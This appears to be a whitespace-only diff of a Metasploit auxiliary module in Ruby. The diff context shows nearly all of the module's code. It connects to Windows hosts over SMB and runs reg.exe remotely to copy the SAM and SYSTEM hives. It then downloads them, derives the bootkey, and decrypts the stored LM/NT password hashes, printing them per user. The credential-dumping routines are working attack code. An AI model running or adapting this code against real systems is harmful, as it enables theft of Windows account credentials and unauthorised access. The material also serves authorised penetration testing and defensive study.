@@ -64,11 +64,11 @@ class Metasploit3 < Msf::Auxiliary
 		#::FileUtils.mkdir_p(logdir) unless ::File.exists?(logdir)
 		hives = [sampath, syspath]
 		smbshare = datastore['SMBSHARE']
-		
+
 		#Try and Connect to the target
 		begin
 			connect()
-		rescue 
+		rescue
 			return
 		end
 
@@ -79,7 +79,7 @@ class Metasploit3 < Msf::Auxiliary
 			print_error("#{ip} - #{autherror}")
 			return
 		end
-		
+
 		begin
 			save_reg_hives(smbshare, ip, sampath, syspath)
 			print_status("#{ip} - Downloading SYSTEM and SAM hive files.")
@@ -88,15 +88,15 @@ class Metasploit3 < Msf::Auxiliary
 			sys, sam = open_hives(logdir, ip, hives)
 			dump_creds(sam, sys, ip)
 			simple.connect(smbshare)
-			disconnect()			
+			disconnect()
 		rescue StandardError => bang
 			print_error("#{ip} - There was an error #{bang}")
 			return bang
 		end
 	end
 
-	
-	
+
+
 	#--------------------------------------------------------------------------------------------------------
 	# This method attempts to use reg.exe to generate copies of the SAM and SYSTEM, registry hives
 	# and store them in the Windows Temp directory on the remote host
@@ -126,13 +126,13 @@ class Metasploit3 < Msf::Auxiliary
 			newdir = "#{logdir}/#{ip}"
 			::FileUtils.mkdir_p(newdir) unless ::File.exists?(newdir)
 			simple.connect("\\\\#{ip}\\#{smbshare}")
-	
+
 			# Get contents of hive file
 			remotesam = simple.open("\\WINDOWS\\Temp\\#{sampath}", 'rob')
 			remotesys = simple.open("\\WINDOWS\\Temp\\#{syspath}", 'rob')
 			samdata = remotesam.read
 			sysdata = remotesys.read
-	
+
 			# Save it to local file system
 			localsam = File.open("#{logdir}/#{ip}/sam", "w+")
 			localsys = File.open("#{logdir}/#{ip}/sys", "w+")
@@ -168,9 +168,9 @@ class Metasploit3 < Msf::Auxiliary
 			return cleanerror
 		end
 	end
-	
-	
-	
+
+
+
 	#-------------------------------------------------------------------------------------------------------
 	# This method should open up a hive file from yoru local system and allow interacting with it
 	#-------------------------------------------------------------------------------------------------------
@@ -205,8 +205,8 @@ class Metasploit3 < Msf::Auxiliary
 				end
 				bootkey << [tmp].pack("H*")
 			end
-	
-			keybytes = bootkey.unpack("C*")				
+
+			keybytes = bootkey.unpack("C*")
 			p = [8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7]
 			scrambled = ""
 			p.each do |i|
@@ -229,7 +229,7 @@ class Metasploit3 < Msf::Auxiliary
 		qwerty = "!@#\$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%\0"
 		account_path = "\\SAM\\Domains\\Account"
 		accounts = sam.relative_query(account_path)
-  
+
 		f = nil
 		accounts.value_list.values.each do |value|
 			if value.name == "F"
@@ -238,7 +238,7 @@ class Metasploit3 < Msf::Auxiliary
 		end
 
 		raise "Hive broken" if not f
- 
+
 		md5 = Digest::MD5.digest(f[0x70,0x10] + qwerty + bootkey + num)
 		rc4 = OpenSSL::Cipher::Cipher.new('rc4')
 		rc4.key = md5
@@ -259,10 +259,10 @@ class Metasploit3 < Msf::Auxiliary
 		begin
 			get_users(sam).each do |user|
 				rid = user.name.to_i(16)
-				hashes = get_user_hashes(user, hbootkey)			
+				hashes = get_user_hashes(user, hbootkey)
 				obj = []
 				obj << get_user_name(user)
-				obj << ":" 
+				obj << ":"
 				obj << rid
 				obj << ":"
 				if hashes[0].empty?
@@ -299,12 +299,12 @@ class Metasploit3 < Msf::Auxiliary
 		end
 		name_offset = v[0x0c, 0x10].unpack("<L")[0] + 0xCC
 		name_length = v[0x10, 0x1c].unpack("<L")[0]
-		
+
 		return v[name_offset, name_length]
 	end
 
-	
-	
+
+
 	#-----------------------------
 	# More code from tools/reg.rb
 	#-----------------------------
@@ -320,9 +320,9 @@ class Metasploit3 < Msf::Auxiliary
 			return getuserserror
 		end
 	end
-	
-	
-	
+
+
+
 	#-----------------------------
 	# More code from tools/reg.rb
 	#-----------------------------
@@ -339,9 +339,9 @@ class Metasploit3 < Msf::Auxiliary
 		nt_hash = v[hash_offset + (lm_exists ? 24 : 8), 16] if nt_exists
 		return decrypt_hashes(rid, lm_hash || nil, nt_hash || nil, hbootkey)
 	end
-	
-	
-	
+
+
+
 	#-----------------------------
 	# More code from tools/reg.rb
 	#-----------------------------
@@ -376,7 +376,7 @@ class Metasploit3 < Msf::Auxiliary
 	def decrypt_hash(rid, hbootkey, enchash, pass)
 		begin
 			des_k1, des_k2 = sid_to_key(rid)
-		
+
 			d1 = OpenSSL::Cipher::Cipher.new('des-ecb')
 			d1.padding = 0
 			d1.key = des_k1
@@ -406,7 +406,7 @@ class Metasploit3 < Msf::Auxiliary
 	end
 
 
-	
+
 	#-----------------------------
 	# More code from tools/reg.rb
 	#-----------------------------
@@ -424,13 +424,13 @@ class Metasploit3 < Msf::Auxiliary
 
 		return string_to_key(s1), string_to_key(s2)
 	end
-	
-	
+
+
 	#-----------------------------
 	# More code from tools/reg.rb
 	#-----------------------------
 	def string_to_key(s)
-	
+
 		parity = [
 			1, 1, 2, 2, 4, 4, 7, 7, 8, 8, 11, 11, 13, 13, 14, 14,
 			16, 16, 19, 19, 21, 21, 22, 22, 25, 25, 26, 26, 28, 28, 31, 31,
@@ -449,7 +449,7 @@ class Metasploit3 < Msf::Auxiliary
 			224,224,227,227,229,229,230,230,233,233,234,234,236,236,239,239,
 			241,241,242,242,244,244,247,247,248,248,251,251,253,253,254,254
 		]
-		
+
 		key = []
 		key << (s[0].unpack('C')[0] >> 1)
 		key << ( ((s[0].unpack('C')[0]&0x01)<<6) | (s[1].unpack('C')[0]>>2) )
@@ -459,16 +459,16 @@ class Metasploit3 < Msf::Auxiliary
 		key << ( ((s[4].unpack('C')[0]&0x1F)<<2) | (s[5].unpack('C')[0]>>6) )
 		key << ( ((s[5].unpack('C')[0]&0x3F)<<1) | (s[6].unpack('C')[0]>>7) )
 		key << ( s[6].unpack('C')[0]&0x7F)
-		
+
 		0.upto(7).each do |i|
 			key[i] = (key[i]<<1)
 			key[i] = parity[key[i]]
 		end
-		
+
 		return key.pack("<C*")
 	end
-	
-	
+
+
 	#------------------------------------------------------------------------------------------------------------------------
 	# This code was stolen straight out of psexec.rb.  Thanks very much for all who contributed to that module!!
 	# Instead of uploading and runing a binary.  This method runs a single windows command fed into the #{command} paramater
@@ -589,7 +589,7 @@ class Metasploit3 < Msf::Auxiliary
 		rescue ::Exception => e
 			print_error("Error: #{e}")
 		end
-			
+
 		begin
 			#print_status("Deleting \\#{filename}...")
 			select(nil, nil, nil, 1.0)
